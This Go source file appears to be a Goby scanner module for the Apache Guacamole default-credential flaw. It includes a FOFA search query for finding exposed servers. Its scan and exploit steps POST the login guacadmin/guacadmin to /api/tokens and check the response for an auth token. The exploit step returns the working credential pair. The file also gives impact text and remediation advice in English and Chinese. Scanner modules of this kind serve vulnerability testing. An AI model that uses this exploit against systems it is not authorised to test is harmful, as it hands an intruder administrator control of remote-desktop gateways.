package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Apache Guacamole tokens Api Default Credential Vulnerability",
    "Description": "<p>Apache Guacamole is a clientless remote desktop gateway. It supports standard protocols like VNC, RDP, and SSH. Apache Guacamole default password may lead information disclosure.</p>",
    "Product": "Apache Guacamole",
    "Homepage": "http://guacamole.apache.org",
    "DisclosureDate": "2022-04-01",
    "Author": "1276896655@qq.com",
    "FofaQuery": "body=\"guacamole\"",
    "GobyQuery": "body=\"guacamole\"",
    "Level": "2",
    "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://wiki.debian.org/Guacamole#:~:text=You%20can%20now%20access%20the,password%20are%20both%20%22guacadmin%22"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/tokens",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "username=guacadmin&password=guacadmin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "application/json",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"username\"",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"authToken\"",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"guacadmin\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/tokens",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "username=guacadmin&password=guacadmin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "application/json",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"username\"",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"authToken\"",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"guacadmin\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|text|guacadmin@guacadmin"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8.3",
    "Translation": {
        "CN": {
            "Name": "Apache Guacamole tokens 接口默认密码漏洞",
            "Product": "Apache Guacamole",
            "Description": "<p><span style=\"font-size: medium;\">Apache Guacamole 是一个无客户端的远程桌面网关，它支持众多标准管理协议，例如 VNC(RFB)，RDP，SSH 等等。Apache <span style=\"color: rgb(22, 51, 102);\">Guacamole</span>存在默认口令，攻击者利用该漏洞获取敏感信息。</span></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。<br></p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Apache Guacamole tokens Api Default Credential Vulnerability",
            "Product": "Apache Guacamole",
            "Description": "<p>Apache Guacamole is a clientless remote desktop gateway. It supports standard protocols like VNC, RDP, and SSH.&nbsp;<span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Apache Guacamole default password may lead info</span><span style=\"font-size: medium;\">rmation disclosure.</span><br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.<br></p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10710"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}